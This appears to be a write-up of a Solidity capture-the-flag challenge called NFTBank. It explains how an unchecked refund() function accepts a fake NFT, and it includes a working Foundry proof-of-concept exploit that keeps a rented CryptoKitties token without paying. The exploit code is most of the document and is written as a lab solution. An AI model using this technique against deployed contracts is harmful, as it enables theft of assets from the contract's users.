# NFTBank

## Description

`refund()` function lacks the check if anyone is adding a fake NFT.
 
An Attacker can create a fake NFT contract and call the `refund` with the new NFT deails which clear out his debt.

Attack Steps:

1. Attackers creates the newNFT and mint 1 token for himself

2. Attckers then approves the bank to rent.

3. Attackers then call the `refund()` funciton with it's collection and id of new NFT he just created.

In refund function, this for loop received the wrong address and id, the default valueu of `rentedNFTs` be 0, which is of `CryptoKitties`

```
for (uint i; i < rentNFTs.length; i++) {
            if (rentNFTs[i].collection == collection && rentNFTs[i].id == id) {
                rentedNft = rentNFTs[i];
            }
        }
```



---

## POC:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {NFTBank} from "../src/NFTBank.sol";
import {ERC721} from "openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "openzeppelin-contracts/contracts/access/Ownable.sol";

contract CryptoKitties is ERC721("CryptoKitties", "MEOW"), Ownable {
    function mint(address to, uint id) external onlyOwner {
        _safeMint(to, id);
    }
}
contract CryptoDoggies is ERC721("CryptoDoggies", "DOG"), Ownable {
    function mint(address to, uint id) external onlyOwner {
        _safeMint(to, id);
    }
}

contract NFTBankHack is Test {
    NFTBank bank;
    CryptoKitties meow;
    address nftOwner = makeAddr("nftOwner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(nftOwner);
        bank = new NFTBank();
        meow = new CryptoKitties();
        for (uint i; i < 10; i++) {
            meow.mint(nftOwner, i);
            meow.approve(address(bank), i);
            bank.addNFT(address(meow), i, 2 gwei, 500 gwei);
        }
        vm.stopPrank();
    }

    function test() public {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        bank.rent{value: 500 gwei}(address(meow), 1);
        vm.warp(block.timestamp + 86400 * 10);
        
        //solution  

        CryptoDoggies dog;
        dog = new CryptoDoggies();

        dog.mint(attacker, 2);
        dog.approve(address(bank), 2);

        bank.refund(address(dog), 2);

        vm.stopPrank();
        
        assertEq(attacker.balance, 1 ether);
        assertEq(meow.ownerOf(1), attacker);
    }
}
```
